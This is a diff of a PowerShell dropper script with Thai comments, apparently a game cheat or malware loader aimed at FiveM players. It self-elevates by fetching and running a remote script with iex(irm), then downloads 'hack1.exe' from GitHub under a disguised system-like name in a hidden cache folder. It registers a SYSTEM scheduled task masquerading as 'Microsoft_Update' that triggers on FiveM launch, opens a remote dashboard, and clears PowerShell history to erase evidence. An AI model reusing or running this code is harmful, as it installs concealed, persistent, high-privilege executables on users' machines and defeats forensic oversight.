@@ -1,84 +1,54 @@
-# สุ่มชื่อไฟล์และ Task
+# 1. [Self-Elevation] ตรวจสอบและขอสิทธิ์ Administrator
+$scriptUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/install.ps1"
+
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$scriptUrl')`"" -Verb RunAs
+    exit
+}
+
+# 2. [Configuration] ตั้งค่าตัวแปรและสุ่มชื่อไฟล์เพื่อความเนียน
 $p_rand = @("font","drv","host","win","svc") | Get-Random
 $m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
 $r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
+
 $fileName = "$p_rand$m_rand`_$r_rand.exe"
 $taskName = "Microsoft_Update_$r_rand"
+$dashboardUrl = "https://creative-bombolone-1e0912.netlify.app/"
+$exeUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/hack1.exe"
 
-# ที่อยู่ไฟล์ (ซ่อนใน AppData เนียนกว่า)
+# ที่อยู่ไฟล์ (ซ่อนใน LocalAppData เพื่อเลียนแบบไฟล์ Cache ระบบ)
 $destFolder = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
-if (!(Test-Path $destFolder)) { New-Item -Path $destFolder -ItemType Directory -Force }
+if (!(Test-Path $destFolder)) { New-Item -Path $destFolder -ItemType Directory -Force | Out-Null }
 $destPath = "$destFolder\$fileName"
 
-# ลิงก์ไฟล์ของคุณ
-$exeUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/hack1.exe"
-# ลิงก์หน้า Dashboard ของคุณ
-$dashboardUrl = "https://creative-bombolone-1e0912.netlify.app/"
-
-while ($true) {
-    Clear-Host
-    Write-Host "--- CANDY ULTRA V7 MANAGER ---" -ForegroundColor Magenta
-    Write-Host "1. Install & Persistence (Auto-run + Open Web)"
-    Write-Host "2. Check Status"
-    Write-Host "3. Self-Destruct (Uninstall)"
-    Write-Host "0. Exit"
-    Write-Host "------------------------------"
+# 3. [Installation] เริ่มการติดตั้ง
+try {
+    Write-Host "[*] System Initializing..." -ForegroundColor Cyan
     
-    $choice = Read-Host "Select Option"
+    # ดาวน์โหลด Engine (hack1.exe)
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing
+    Unblock-File -Path $destPath
 
-    if ($choice -eq "1") {
-        Clear-Host
-        Write-Host "[*] Downloading Engine..." -ForegroundColor Cyan
+    # 4. [Persistence] ตั้งค่าให้รันอัตโนมัติเมื่อเปิด FiveM (ใช้ Event ID 4688)
+    auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
+    
+    # Filter ตรวจจับการเปิด FiveM หรือ GTAProcess
+    $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName'] and (contains(.,'FiveM.exe') or contains(.,'FiveM_GTAProcess.exe'))]]"
+    
+    # สร้าง Task Scheduler รันด้วยสิทธิ์ SYSTEM (สูงสุด)
+    schtasks /create /tn "$taskName" /tr "'$destPath'" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f | Out-Null
 
-        try {
-            # 1. ดาวน์โหลดไฟล์ EXE
-            $web = New-Object System.Net.WebClient
-            $web.Headers.Add("User-Agent", "Mozilla/5.0")
-            $web.DownloadFile($exeUrl, $destPath)
-            Unblock-File -Path $destPath
+    Write-Host "[+] Installation Complete." -ForegroundColor Green
 
-            # 2. ตั้งค่าระบบรันอัตโนมัติ (Task Scheduler)
-            auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
-            $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName'] and (contains(.,'FiveM.exe') or contains(.,'FiveM_GTAProcess.exe'))]]"
-            schtasks /create /tn "$taskName" /tr "'$destPath'" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f | Out-Null
+    # 5. [Web Control] เปิดหน้า Dashboard สำหรับควบคุมทันที
+    Start-Process $dashboardUrl
 
-            Write-Host "[+] Installation Successful!" -ForegroundColor Green
-            
-            # --- ส่วนที่เพิ่ม: เปิดหน้าเว็บควบคุมทันที ---
-            Write-Host "[*] Launching Dashboard..." -ForegroundColor Cyan
-            Start-Process $dashboardUrl
-            
-            Write-Host "[!] System is now listening for FiveM launch." -ForegroundColor Yellow
-        }
-        catch {
-            Write-Host "[X] Failure: $($_.Exception.Message)" -ForegroundColor Red
-        }
-        pause
-    }
-    elseif ($choice -eq "2") {
-        Clear-Host
-        Write-Host "--- SYSTEM STATUS ---" -ForegroundColor Cyan
-        if (Test-Path $destPath) {
-            Write-Host "Status: ACTIVE" -ForegroundColor Green
-            Write-Host "File  : $fileName"
-            # เปิดเว็บจากหน้านี้ได้ด้วย
-            $webChoice = Read-Host "Open Dashboard now? (y/n)"
-            if ($webChoice -eq "y") { Start-Process $dashboardUrl }
-        } else {
-            Write-Host "Status: NOT INSTALLED" -ForegroundColor Red
-        }
-        pause
-    }
-    elseif ($choice -eq "3") {
-        schtasks /delete /tn "$taskName" /f 2>$null
-        Remove-Item $destPath -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] Cleaned all traces." -ForegroundColor Green
-        pause
-    }
-    elseif ($choice -eq "0") {
-        $historyPath = (Get-PSReadlineOption).HistorySavePath
-        if (Test-Path $historyPath) { Clear-Content $historyPath -Force }
-        Clear-History
-        exit
-    }
+    # 6. [Anti-Forensics] ล้างประวัติการพิมพ์คำสั่งเพื่อลบหลักฐาน
+    $historyPath = (Get-PSReadlineOption).HistorySavePath
+    if (Test-Path $historyPath) { Clear-Content $historyPath -Force }
+    Clear-History
+}
+catch {
+    # ปิดเงียบหากเกิดข้อผิดพลาด
 }
